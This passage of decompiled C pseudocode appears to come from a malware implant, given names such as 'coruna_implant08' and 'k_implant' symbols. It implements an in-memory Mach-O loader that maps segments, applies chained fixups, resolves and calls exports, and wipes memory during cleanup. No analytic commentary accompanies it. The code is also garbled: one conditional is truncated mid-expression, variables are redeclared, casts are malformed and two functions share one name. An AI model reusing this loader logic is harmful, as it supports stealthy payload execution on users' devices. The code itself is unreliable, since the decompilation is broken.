                  type_id_15 = (**(void (**)(addr + 0x40))(addr,buf + 1,bootargs,1,0);
                }
              }
            }
            ls9 = _strlen(obj);
            _bzero(obj,ls9);
            _free(obj);
          }
          else {
            type_id_15 = 0;
          }
          type_id_10 = type_id_10 + 1;
        } while ((int)type_id_15 == 0);
        }
      }
    }
  }
  __Block_object_dispose(&cache_56,8);
  __Block_object_dispose(&stack_guard,8);
  __Block_object_dispose(&tmp_buf,8);
load_ok_42:
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return type_id_15;
  }
  ___stack_chk_fail();
}





uint64_t coruna_wire_store_u32_pair(long handle,long addr_2)
{
  *(uint8_t *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18) = 1;
  *(uint32_t *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x18) = *(uint32_t *)(addr_2 + 8);
  *(uint32_t *)(*(long *)(*(long *)(handle + 0x30) + 8) + 0x18) = *(uint32_t *)(addr_2 + 0xc);
  return 0;
}





void coruna_block_assign_18f78(long handle,long addr_2)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  __Block_object_assign((void *)(handle + 0x28),*(void **)(addr_2 + 0x28),8);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  __Block_object_assign((void *)(handle + 0x30),*(void **)(addr_2 + 0x30),8);
  return;
}





void coruna_block_dispose_18fd8(long handle)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  __Block_object_dispose(*(void **)(handle + 0x30),8);
  __Block_object_dispose(*(void **)(handle + 0x28),8);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}





uint8_t * coruna_getattrlistbulk_paths(long *handle)
{
  int *err;
  long handle;
  int *status;
  long addr;
  uint u;
  uint size;
  unsigned long version;
  uint8_t *ptr;
  unsigned long port;
  int *flags;
  unsigned long tag;
  long off;
  unsigned long kind;
  uint type_id;
  unsigned long type_id_8;
  int *count;
  
  ptr = (uint8_t *)0xad001;
  if ((((handle != (long *)0x0) && (flags = (int *)handle[0x29], flags != (int *)0x0)) &&
      (tag = handle[0x2a], tag != 0)) && ((*handle != 0 && (8 < tag)))) {
    if (*flags == -0x35014542 || *flags == -0x41450136) {
      ptr = &k_implant_rodata_word_12006;
      u = flags[1];
      if (u != 0) {
        type_id = 0;
        kind = 0;
        off = 0;
        u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
        type_id_8 = (unsigned long)(u >> 0x10 | u << 0x10);
        err = (int *)((long)flags + tag);
        count = flags + 7;
        do {
          if ((long)tag < 0) {
            return &k_implant_rodata_word_12004;
          }
          if (count + -5 < flags) {
            return &k_implant_rodata_word_12004;
          }
          if (err <= count + -5) {
            return &k_implant_rodata_word_12004;
          }
          if (count < flags) {
            return &k_implant_rodata_word_12004;
          }
          if (err < count) {
            return &k_implant_rodata_word_12004;
          }
          u = (count[-3] & 0xff00ff00U) >> 8 | (count[-3] & 0xff00ffU) << 8;
          port = (unsigned long)(u >> 0x10 | u << 0x10);
          if ((long)tag <= (long)port) {
            return &k_implant_rodata_word_12005;
          }
          u = (count[-2] & 0xff00ff00U) >> 8 | (count[-2] & 0xff00ffU) << 8;
          version = (unsigned long)(u >> 0x10 | u << 0x10);
          handle = (long)flags + port;
          status = (int *)(handle + version);
          if (status < flags || err < status) {
            return &k_implant_rodata_word_12005;
          }
          if (count[-5] == 0xc000001) {
            u = (count[-4] & 0xff00ff00U) >> 8;
            u = (u | (count[-4] & 0xff0000U) << 8) >> 0x10 | u << 0x10;
            addr = off;
            port = kind;
            size = type_id;
            if (type_id <= u) {
              addr = handle;
              port = version;
              size = u;
            }
            if ((int)u <= *(int *)(*handle + 0x18)) {
              off = addr;
              kind = port;
              type_id = size;
            }
          }
          count = count + 5;
          type_id_8 = type_id_8 - 1;
        } while (type_id_8 != 0);
        ptr = &k_implant_rodata_word_12006;
        if (off != 0) {
          ptr = (uint8_t *)0x0;
          handle[0x29] = off;
          handle[0x2a] = kind;
          handle[0x2c] = 0;
        }
      }
    }
    else {
      ptr = (uint8_t *)0x0;
    }
  }
  return ptr;
}





uint8_t * coruna_bzero_3_2(long handle)
{
  long *ptr;
  char err;
  byte err;
  ushort u;
  void *buf;
  void *str;
  long *copy;
  void *data;
  unsigned long size;
  uint version;
  long handle;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  long addr;
  
  if (handle == 0) {
    return &k_implant_rodata_word_12011;
  }
  addr = *(long *)(handle + 0x1a8);
  if (((addr != 0) && (data = *(void **)(handle + 0x1b8), data != (void *)0x0)) &&
     (handle = *(long *)(handle + 0x1a0), handle != 0)) {
    version = *(uint *)(handle + 0xc);
    kind = (unsigned long)version;
    if ((version != 0) && (*(int *)(handle + 0x14) - 1U < 0x1fffffff)) {
      size = (unsigned long)(version << 4);
      buf = _calloc(size,1);
      if (buf == (void *)0x0) {
        return (uint8_t *)0xad009;
      }
      version = *(uint *)(handle + 0x14);
      port = (unsigned long)version;
      str = data;
      if (*(char *)(handle + 0x1c2) == '\0') {
        str = _malloc(port);
        if (str == (void *)0x0) {
          _bzero(buf,size);
          _free(buf);
          return (uint8_t *)0xad009;
        }
        _memcpy(str,data,port);
      }
      tag = 0;
      err = *(char *)(handle + 0x1c4);
      copy = (long *)(addr + 8);
      do {
        err = *(byte *)((long)copy + -4);
        if (((err != '\0') || ((err & 1) != 0)) && ((err & 0xe) != 0 && (err & 0xe0) == 0))
        {
          addr = *copy;
          handle = *(long *)(handle + 0x50);
          u = *(ushort *)((long)copy + -2);
          ptr = (long *)((long)buf + tag * 0x10);
          *ptr = (long)str + (unsigned long)*(uint *)(copy + -1);
          ptr[1] = handle + addr | (unsigned long)(u >> 3) & 1;
          tag = (unsigned long)((int)tag + 1);
        }
        copy = copy + 2;
        kind = kind - 1;
      } while (kind != 0);
      if ((*(uint *)(handle + 0xb0) != 0) && (*(void **)(handle + 0xa8) != (void *)0x0)) {
        _bzero(*(void **)(handle + 0xa8),(unsigned long)*(uint *)(handle + 0xb0) << 4);
        _free(*(void **)(handle + 0xa8));
      }
      if (((*(char *)(handle + 0xc4) == '\0') && (*(uint *)(handle + 0xc0) != 0)) &&
         (*(void **)(handle + 0xb8) != (void *)0x0)) {
        _bzero(*(void **)(handle + 0xb8),(unsigned long)*(uint *)(handle + 0xc0));
        _free(*(void **)(handle + 0xb8));
      }
      if ((int)tag == 0) {
        if (*(char *)(handle + 0x1c2) == '\0') {
          _bzero(str,port);
          _free(str);
        }
        _bzero(buf,size);
        _free(buf);
        buf = (void *)0x0;
        version = 0;
        str = (void *)0x0;
      }
      *(int *)(handle + 0xb0) = (int)tag;
      *(void **)(handle + 0xa8) = buf;
      *(void **)(handle + 0xb8) = str;
      *(uint *)(handle + 0xc0) = version;
      *(uint8_t *)(handle + 0xc4) = *(uint8_t *)(handle + 0x1c2);
      return (uint8_t *)0x0;
    }
  }
  return (uint8_t *)0x0;
}





uint8_t * coruna_lookup_export(long handle,char *path,unsigned long *arg)
{
  int *err;
  unsigned long u;
  int err;
  uint8_t *ptr;
  int *status;
  unsigned long size;
  unsigned long *buf;
  
  ptr = &k_implant_rodata_word_12011;
  if (((handle != 0) && (path != (char *)0x0)) && (arg != (unsigned long *)0x0)) {
    size = (unsigned long)*(uint *)(handle + 0xb0);
    if (*(uint *)(handle + 0xb0) != 0) {
      buf = (unsigned long *)(*(long *)(handle + 0xa8) + 8);
      do {
        err = _strcmp((char *)buf[-1],path);
        if (err == 0) {
          size = *buf;
          err = *(int *)(*(long *)(handle + 8) + 0x10);
          *arg = size;
          return (uint8_t *)0x0;
        }
        buf = buf + 2;
        size = size - 1;
      } while (size != 0);
    }
    ptr = &k_implant_rodata_word_12001;
  }
  return ptr;
}





uint64_t coruna_macho_run_exports(long *handle,uint64_t val)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  long *action;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (*handle != 0)) {
    if ((*(ushort *)(handle + 0x38) & 1) == 0) {
      u = 0;
    }
    else {
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_26a70;
      thread_attr = coruna_implant08_residual_13;
      host_info = &k_implant_rodata_word_28760;
      serial_buf = val;
      action = handle;
      u = coruna_macho_foreach_loadcmd(&thread_attr,handle,0x19,&scratch);
    }
  }
  return u;
}





uint8_t * coruna_implant08_residual_13(long handle,long addr_2)
{
  uint *ptr;
  uint8_t *buf;
  long handle;
  long addr;
  unsigned long u;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  
  version = addr_2 + 0x48;
  port = version + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  if (version < port) {
    do {
      if (*(char *)(version + 0x40) == '\x16') {
        tag = *(unsigned long *)(version + 0x28);
        if (tag < 4) goto fail;
        addr = *(long *)(handle + 0x28);
        ptr = (uint *)(*(long *)(addr + 0x18) + *(long *)(version + 0x20));
        kind = *(unsigned long *)(addr + 0x40);
        size = kind + *ptr;
        if (size < kind || *(long *)(addr + 0x48) + kind <= size) {
done:
          return &k_implant_rodata_word_12008;
        }
        size = 1;
        while (buf = (uint8_t *)(**(void (**)(*(long *)(handle + 0x20) + 0x10))(),
              (int)buf == 0 && size < tag >> 2) {
          u = *(unsigned long *)(*(long *)(handle + 0x28) + 0x40);
          kind = u + ptr[size];
          size = (unsigned long)((int)size + 1);
          if (kind < u || *(long *)(*(long *)(handle + 0x28) + 0x48) + u <= kind)
          return &k_implant_rodata_word_12008;
        }
      }
      else {
        if (*(char *)(version + 0x40) == '\t') {
          handle = *(long *)(handle + 0x28);
          addr = 2;
          if (*(char *)(handle + 0x90) != '\0') {
            addr = 3;
          }
          tag = *(unsigned long *)(version + 0x28) >> addr;
          if (tag != 0) {
            size = 0;
            addr = *(long *)(handle + 0x18) + *(long *)(version + 0x20);
            kind = 1;
            if (*(char *)(handle + 0x90) == '\0') goto cleanup;
            do {
              u = *(unsigned long *)(addr + size * 8);
              size = kind;
              while( true ) {
                if (u < *(unsigned long *)(handle + 0x40) ||
                    return &k_implant_rodata_word_12008;
              }
            } while( true );
          }
        }
fail:
        buf = (uint8_t *)0x0;
      }
check_ok:
      version = version + 0x50;
    } while ((int)buf == 0 && version < port);
  }
  else {
    buf = (uint8_t *)0x0;
  }
  return buf;
}





void coruna_block_assign_copy(long handle,long addr_2)
{
  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),7);
  return;
}





void coruna_block_dispose_copy(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x20),7);
  return;
}





uint64_t coruna_macho_run_exports_block(long *handle,uint64_t val)
{
  uint32_t u;
  uint64_t size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t serial_buf;
  long *action;
  
  size = 0xad001;
  if ((handle != (long *)0x0) && (*handle != 0)) {
    if ((*(ushort *)(handle + 0x38) >> 2 & 1) == 0) {
      size = 0;
    }
    else {
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_26a70;
      thread_attr = coruna_implant08_residual_14;
      host_info = &k_implant_rodata_word_28790;
      u = 0x11;
      if ((char)handle[0x12] != '\0') {
        u = 0x1a;
      }
      serial_buf = val;
      action = handle;
      size = coruna_macho_foreach_loadcmd(handle,u,&scratch);
    }
  }
  return size;
}





uint8_t * coruna_implant08_residual_14(long handle,long addr_2)
{
  uint8_t *ptr;
  long handle;
  unsigned long u;
  
  handle = *(long *)(handle + 0x28);
  if (*(char *)(handle + 0x90) == '\0') {
    u = (unsigned long)*(uint *)(addr_2 + 8);
  }
  else {
    u = *(unsigned long *)(addr_2 + 8);
  }
  u = *(long *)(handle + 0x50) + u;
  if (u < *(unsigned long *)(handle + 0x40) ||
      *(long *)(handle + 0x48) + *(unsigned long *)(handle + 0x40) <= u) {
    return &k_implant_rodata_word_12008;
  }
  ptr = (uint8_t *)(**(void (**)(*(long *)(handle + 0x20) + 0x10))();
  return ptr;
}





uint64_t coruna_macho_close_image(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if ((*(ushort *)(handle + 0x1c0) & 0x42) == 2) {
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_26a78;
    thread_attr = coruna_implant08_residual_15;
    host_info = &k_implant_rodata_word_287c0;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
  }
  else {
    u = 0;
  }
  return u;
}





uint8_t * coruna_implant08_residual_15(long handle,long addr_2)
{
  unsigned long u;
  unsigned long size;
  unsigned long version;
  void *ptr;
  unsigned long port;
  uint tag;
  unsigned long kind;
  long handle;
  unsigned long type_id;
  
  u = addr_2 + 0x48;
  kind = u + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  do {
    if (kind <= u) {
      return (uint8_t *)0x0;
    }
    if ((*(char *)(u + 0x40) == '\n') && (type_id = *(unsigned long *)(u + 0x28), 7 < type_id)) {
      handle = *(long *)(handle + 0x20);
      if (*(long *)(handle + 0x10) < 0) {
        return &k_implant_rodata_word_12009;
      }
      size = *(long *)(handle + 0x18) + *(long *)(u + 0x20);
      port = *(unsigned long *)(handle + 8);
      version = port + *(long *)(handle + 0x10);
      if (size < port || version <= size) {
        return &k_implant_rodata_word_12009;
      }
      if ((long)type_id < 0) {
        return &k_implant_rodata_word_12009;
      }
      if (size + type_id < port || version < size + type_id) {
        return &k_implant_rodata_word_12009;
      }
      if (size == 0) {
        return (uint8_t *)0xad001;
      }
      ptr = _realloc(*(void **)(handle + 200),
                        (type_id & 0xfffffffffffffff8) + (unsigned long)(uint)(*(int *)(handle + 0xd0) << 3));
      if (ptr == (void *)0x0) {
        return (uint8_t *)0xad009;
      }
      type_id = type_id >> 3;
      *(void **)(handle + 200) = ptr;
      tag = *(uint *)(handle + 0xd0) + 1;
      *(uint64_t *)((long)ptr + (unsigned long)*(uint *)(handle + 0xd0) * 8) =
           *(uint64_t *)(size + (type_id - 1) * 8);
      if (type_id - 1 != 0) {
        do {
          *(uint64_t *)(*(long *)(handle + 200) + (unsigned long)tag * 8) =
               *(uint64_t *)((size - 0x10) + type_id * 8);
          tag = tag + 1;
          type_id = type_id - 1;
        } while (type_id != 1);
      }
      *(uint *)(handle + 0xd0) = tag;
    }
    u = u + 0x50;
  } while( true );
}





uint64_t coruna_fixup_dispatch(long handle)
{
  uint64_t u;
  
  if (handle == 0) {
    return 0xad001;
  }
  if ((*(long *)(handle + 0x188) == 0) && (*(long *)(handle + 0x198) == 0)) {
    if (*(char *)(handle + 0x138) != '\0') {
      return 0x910016;
    }
    u = coruna_macho_apply_fixups();
    return u;
  }
  u = coruna_macho_apply_chained_fixups();
  return u;
}





uint64_t coruna_macho_map_segments(uint64_t *val)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  uint64_t *serial_buf;
  
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (k_implant_rodata_word_26a88 < *(double *)k_implant_dyldversionnumber_slot) {
    scratch = k_implant_nsconcretestackblock_slot;
    bootargs = k_implant_rodata_word_26a78;
    thread_attr = coruna_macho_cfstring;
    host_info = &k_implant_rodata_word_288b0;
    serial_buf = val;
    u = coruna_macho_foreach_loadcmd(val,0x19,&scratch);
    if ((int)u != 0) {
      return u;
    }
    if ((*(char *)((long)val + 0x79) != '\0') && (*(char *)(val + 0x27) == '\0')) {
      u = coruna_objc_metaclass_prefix(*val,val);
      return u;
    }
  }
  return 0;
}





uint64_t coruna_implant_stub_17(long handle)
{
  uint64_t u;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    if (((*(char *)(handle + 0x110) == '\0') && (*(void **)(handle + 0x100) != (void *)0x0)) &&
       (*(size_t *)(handle + 0x108) != 0)) {
      _bzero(*(void **)(handle + 0x100),*(size_t *)(handle + 0x108));
    }
    u = 0;
  }
  return u;
}





uint64_t coruna_bzero(long handle)
{
  uint64_t u;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    if (((*(char *)(handle + 0x110) == '\0') && (*(void **)(handle + 0x100) != (void *)0x0)) &&
       (*(size_t *)(handle + 0x108) != 0)) {
      _bzero(*(void **)(handle + 0x100),*(size_t *)(handle + 0x108));
    }
    u = 0;
  }
  return u;
}





long * coruna_macho_open_image(long handle,uint size,long addr_2,int flags,uint8_t buf)
{
  long *ptr;
  
  ptr = (long *)0x0;
  if ((((handle != 0) && (size != 0)) && (addr_2 != 0)) &&
     (((flags != 0 && (flags != -1)) && (ptr = _calloc(0x1c8,1), ptr != (long *)0x0)))) {
    ptr[0x29] = handle;
    ptr[0x2a] = (unsigned long)size;
    *ptr = addr_2;
    *(int *)(ptr + 0xb) = flags;
    *(uint32_t *)(ptr + 4) = *(uint32_t *)k_implant_mach_task_self_slot;
    *(uint8_t *)(ptr + 0x27) = buf;
    *(uint8_t *)((long)ptr + 0xfc) = 1;
    *(uint8_t *)((long)ptr + 0x1c3) = 1;
    *(uint8_t *)(ptr + 0x12) = 1;
  }
  return ptr;
}





uint64_t coruna_ctx_free(uint64_t *val)
{
  uint64_t u;
  
  if (val != (uint64_t *)0x0) {
    u = coruna_mach_vm_deallocate();
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[0xf] = 0;
    val[0xe] = 0;
    val[0x11] = 0;
    val[0x10] = 0;
    val[0x13] = 0;
    val[0x12] = 0;
    val[0x15] = 0;
    val[0x14] = 0;
    val[0x17] = 0;
    val[0x16] = 0;
    val[0x19] = 0;
    val[0x18] = 0;
    val[0x1b] = 0;
    val[0x1a] = 0;
    val[0x1d] = 0;
    val[0x1c] = 0;
    val[0x1f] = 0;
    val[0x1e] = 0;
    val[0x21] = 0;
    val[0x20] = 0;
    val[0x23] = 0;
    val[0x22] = 0;
    val[0x25] = 0;
    val[0x24] = 0;
    val[0x27] = 0;
    val[0x26] = 0;
    val[0x29] = 0;
    val[0x28] = 0;
    val[0x2b] = 0;
    val[0x2a] = 0;
    val[0x2d] = 0;
    val[0x2c] = 0;
    val[0x2f] = 0;
    val[0x2e] = 0;
    val[0x31] = 0;
    val[0x30] = 0;
    val[0x33] = 0;
    val[0x32] = 0;
    val[0x35] = 0;
    val[0x34] = 0;
    val[0x37] = 0;
    val[0x36] = 0;
    val[0x38] = 0;
    _free(val);
    return u;
  }
  return 0xad001;
}





int coruna_mach_vm_deallocate(long *handle)
{
  int err;
  void (*ptr)(void);
  bool err;
  uint8_t *ptr;
  kern_return_t lk5;
  int status;
  int flags;
  int count;
  int idx;
  long handle;
  void (*buf)(void);
  long *ptr;
  long addr;
  unsigned long u;
  long off;
  unsigned long size;
  unsigned long scratch;
  long bootargs;
  
  idx = 0xad001;
  if ((handle == (long *)0x0) || (*handle == 0)) {
    return 0xad001;
  }
  if ((char)handle[0x27] != '\0') {
    if (((*(char *)((long)handle + 0xfb) == '\0') || (handle[8] == 0)) || (handle[9] == 0)) {
      status = 0;
    }
    else {
      lk5 = _mach_vm_deallocate(*(vm_map_t *)(handle + 0xb),handle[8],handle[9]);
      status = 0;
      if (lk5 != 0) {
        status = 0x14011;
      }
    }
    goto fail;
  }
  if (*(char *)((long)handle + 0xf9) == '\0') {
done:
    status = 0;
    err = true;
  }
  else {
    if (k_implant_cxa_finalize_ranges_slot == (uint8_t *)0x0) {
      ___cxa_finalize(handle[8]);
    }
    else {
      scratch = handle[8];
      bootargs = handle[9];
      ___cxa_finalize_ranges(&scratch,1);
    }
    if ((int)handle[0x1a] == 0) goto done;
    size = 0;
    do {
      buf = *(void (**)(handle[0x19] + size * 8);
      ptr = (void (*)handle[1];
      err = ptr <= buf && buf < ptr + handle[2];
      if (ptr > buf || buf >= ptr + handle[2]) {
        status = 0x12009;
        flags = status;
        if (((char)handle[0x1f] != '\0') && (flags = coruna_objc_resolve_method(*handle,handle,0x3c), !err)) {
        flags = status;
        }
        status = coruna_munmap(handle);
        if (flags != 0) {
        status = flags;
        }
      }
      (*buf)();
      size = size + 1;
    } while (size < *(uint *)(handle + 0x1a));
    status = 0;
  }
cleanup:
  flags = status;
  if (((char)handle[0x1f] != '\0') && (flags = coruna_objc_resolve_method(*handle,handle,0x3c), !err)) {
    flags = status;
  }
  status = coruna_munmap(handle);
  if (flags != 0) {
    status = flags;
  }
fail:
  ptr = k_implant_mach_task_self_slot;
  flags = status;
  if (((*(char *)((long)handle + 0xfa) != '\0') && (handle[1] != 0)) && (handle[2] != 0)) {
    if ((int)handle[0x11] == 0) {
      flags = 0;
    }
    else {
      off = 0;
      size = 0;
      count = 0;
      do {
        scratch = scratch & 0xffffffffffffff00;
        flags = coruna_mlock_range(*handle,*(uint32_t *)ptr,*(uint64_t *)(handle[0x10] + off),
                             ((uint64_t *)(handle[0x10] + off))[1],3,&scratch);
        err = 0x1400e;
        if ((char)scratch != '\0') {
          err = 0;
        }
        if (flags != 0) {
          err = flags;
        }
        flags = err;
        if (count != 0) {
          flags = count;
        }
        if (err != 0) break;
        _bzero(*(void **)(handle[0x10] + off),((uint64_t *)(handle[0x10] + off))[1]);
        size = size + 1;
        off = off + 0x18;
        count = flags;
      } while (size < *(uint *)(handle + 0x11));
    }
    count = flags;
    if ((char)handle[0xf] == '\0') {
      if (((char)handle[0x1f] != '\0') && (count = coruna_objc_metaclass_prefix(handle), flags != 0)) {
        count = flags;
      }
    }
    else {
      lk5 = _mach_vm_deallocate(*(vm_map_t *)ptr,handle[1],handle[2]);
      err = 0x1400c;
      if (flags != 0) {
        err = flags;
      }
      if (lk5 != 0) {
        count = err;
      }
    }
    *(uint8_t *)(handle + 0xf) = 0;
    *(uint8_t *)((long)handle + 0xfa) = 0;
    handle[1] = 0;
    handle[2] = 0;
    ptr = (long *)*handle;
    if (ptr != (long *)0x0) {
      off = *ptr;
      if (((off == 0) || (*(void (**)(off + 0x28) == (void (*)0x0)) || (ptr[1] == 0)) {
        idx = 0;
      }
      else {
        idx = (**(void (**)(off + 0x28))(off,ptr[1],0xc,(int)handle[0xb]);
      }
    }
    if (count != 0) {
      idx = count;
    }
    flags = idx;
    if (status != 0) {
      flags = status;
    }
    if ((void *)handle[0x10] != (void *)0x0) {
      _free((void *)handle[0x10]);
    }
  }
  if ((*(uint *)(handle + 0x16) != 0) && ((void *)handle[0x15] != (void *)0x0)) {
    _bzero((void *)handle[0x15],(unsigned long)*(uint *)(handle + 0x16) << 4);
    _free((void *)handle[0x15]);
  }
  *(uint32_t *)(handle + 0x16) = 0;
  handle[0x15] = 0;
  if (((*(char *)((long)handle + 0xc4) == '\0') && (*(uint *)(handle + 0x18) != 0)) &&
     ((void *)handle[0x17] != (void *)0x0)) {
    _bzero((void *)handle[0x17],(unsigned long)*(uint *)(handle + 0x18));
    _free((void *)handle[0x17]);
  }
  handle[0x17] = 0;
  *(uint32_t *)(handle + 0x18) = 0;
  *(uint8_t *)((long)handle + 0xc4) = 0;
  if ((void *)handle[0x19] != (void *)0x0) {
    _free((void *)handle[0x19]);
  }
  ptr = (long *)handle[0x1b];
  if (ptr != (long *)0x0) goto check_ok;
  while (ptr = (long *)handle[0x28], ptr != (long *)0x0) {
    handle[0x28] = *ptr;
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
check_ok:
    _free(ptr);
  }
  size = (unsigned long)*(uint *)(handle + 0x14);
  if ((*(uint *)(handle + 0x14) != 0) && (off = handle[0x13], off != 0)) {
    addr = 0;
    u = 1;
    while( true ) {
      handle = *(long *)(off + addr + 8);
      if ((handle != 0) && (*(void (**)(handle + 8) != (void (*)0x0)) {
        (**(void (**)(handle + 8))(handle,*(uint64_t *)(off + addr));
        size = (unsigned long)*(uint *)(handle + 0x14);
      }
      if (size <= u) break;
      off = handle[0x13];
      u = u + 1;
      addr = addr + 0x10;
    }
    _free((void *)handle[0x13]);
  }
  handle[0x28] = 0;
  handle[0x25] = 0;
  handle[0x24] = 0;
  handle[0x27] = 0;
  handle[0x26] = 0;
  handle[0x21] = 0;
  handle[0x20] = 0;
  handle[0x23] = 0;
  handle[0x22] = 0;
  handle[0x1d] = 0;
  handle[0x1c] = 0;
  handle[0x1f] = 0;
  handle[0x1e] = 0;
  handle[0x19] = 0;
  handle[0x18] = 0;
  handle[0x1b] = 0;
  handle[0x1a] = 0;
  handle[0x15] = 0;
  handle[0x14] = 0;
  handle[0x17] = 0;
  handle[0x16] = 0;
  handle[0x11] = 0;
  handle[0x10] = 0;
  handle[0x13] = 0;
  handle[0x12] = 0;
  handle[0xd] = 0;
  handle[0xc] = 0;
  handle[0xf] = 0;
  handle[0xe] = 0;
  handle[9] = 0;
  handle[8] = 0;
  handle[0xb] = 0;
  handle[10] = 0;
  handle[5] = 0;
  handle[4] = 0;
  handle[7] = 0;
  handle[6] = 0;
  handle[1] = 0;
  *handle = 0;
  handle[3] = 0;
  handle[2] = 0;
  return flags;
}





uint64_t coruna_macho_get_uuid(uint64_t *val)
{
  int err;
  
  if (val != (uint64_t *)0x0) {
    if ((((*(char *)(val + 0x26) == '\0') && (val[0x25] != 0)) && (val[0x23] != 0)) &&
       (err = coruna_mlock_range(*val,*(uint32_t *)k_implant_mach_task_self_slot,val[0x23],
                             val[0x25],3,0), err == 0)) {
      _bzero((void *)val[0x23],val[0x25]);
      val[0x23] = 0;
      val[0x24] = 0;
      val[0x25] = 0;
    }
    val[0x36] = 0;
    val[0x35] = 0;
    val[0x38] = 0;
    val[0x37] = 0;
    val[0x32] = 0;
    val[0x31] = 0;
    val[0x34] = 0;
    val[0x33] = 0;
    val[0x2e] = 0;
    val[0x2d] = 0;
    val[0x30] = 0;
    val[0x2f] = 0;
    val[0x2a] = 0;
    val[0x29] = 0;
    val[0x2c] = 0;
    val[0x2b] = 0;
    *(uint8_t *)((long)val + 0xfc) = 0;
    return 0;
  }
  return 0xad001;
}





uint8_t * coruna_lookup_export(long handle,long addr_2,uint64_t val,uint size,long *off_3)
{
  unsigned long u;
  unsigned long size;
  long handle;
  unsigned long version;
  uint8_t *ptr;
  char scratch;
  
  ptr = (uint8_t *)0xad001;
  if ((((handle != 0) && (addr_2 != 0)) && ((int)val != 0)) && (off_3 != (long *)0x0)) {
    scratch = '\x01';
    ptr = (uint8_t *)coruna_host_processors(&scratch);
    if ((int)ptr == 0) {
      if (scratch == '\0') {
        handle = coruna_macho_open_image(addr_2,val,handle,*(uint32_t *)k_implant_mach_task_self_slot,0)
        ;
        if (handle == 0) {
          ptr = &k_implant_rodata_word_12002;
        }
        else {
          version = 0;
          *(byte *)(handle + 0x110) = (byte)size & 1;
          *(bool *)(handle + 0x130) = (size & 5) != 0;
          *(byte *)(handle + 0x1c3) = ((byte)((size & 0xff) >> 1) ^ 0xff) & 1;
          *(byte *)(handle + 0x1c4) = (byte)((size & 0xff) >> 4) & 1;
          size = 0xf;
          if ((size & 4) == 0) {
            size = 0x10;
          }
          do {
            u = version + 1;
            ptr = (uint8_t *)(*(void (*)(&ptr_implant_fn_287e0)[version])(handle);
            version = u;
          } while ((int)ptr == 0 && u < size);
          if ((int)ptr == 0) {
            *off_3 = handle;
          }
          else {
            coruna_ctx_free(handle);
          }
        }
      }
      else {
        ptr = (uint8_t *)0xad008;
      }
    }
  }
  return ptr;
}





uint64_t coruna_objc_resolve_lazy(long *handle)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != (long *)0x0) && (*handle != 0)) {
    if (*(char *)((long)handle + 0x79) == '\0') {
      u = 0;
    }
    else {
      u = coruna_objc_scan_methlist(*handle,handle);
      if ((int)u == 0) {
        u = coruna_objc_resolve_method(*handle,handle,0x28);
        *(bool *)(handle + 0x1f) = (int)u == 0;
        *(uint8_t *)(handle + 0xf) = 0;
      }
    }
  }
  return u;
}





uint64_t coruna_macho_run_on_loadcmds(long *handle)
{
  ushort u;
  uint64_t size;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long *serial_buf;
  long *action;
  
  if (handle == (long *)0x0) {
    return 0xad001;
  }
  if (*handle == 0) {
fail:
    size = 0xad001;
  }
  else {
    u = *(ushort *)(handle + 0x38);
    if ((u >> 2 & 1) != 0) {
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_26a78;
      thread_attr = coruna_implant08_residual_16;
      host_info = &k_implant_rodata_word_288d0;
      serial_buf = handle;
      size = coruna_macho_foreach_loadcmd(handle,0x1a,&scratch);
      if ((int)size != 0) {
        return size;
      }
      if (*handle == 0) goto fail;
      u = *(ushort *)(handle + 0x38);
    }
    if ((u & 1) != 0) {
      serial_buf = (long *)handle[3];
      scratch = k_implant_nsconcretestackblock_slot;
      bootargs = k_implant_rodata_word_26a78;
      thread_attr = coruna_last;
      host_info = &k_implant_rodata_word_288f0;
      action = handle;
      size = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
      if ((int)size != 0) {
        return size;
      }
    }
    size = 0;
    *(uint8_t *)((long)handle + 0xf9) = 1;
  }
  return size;
}





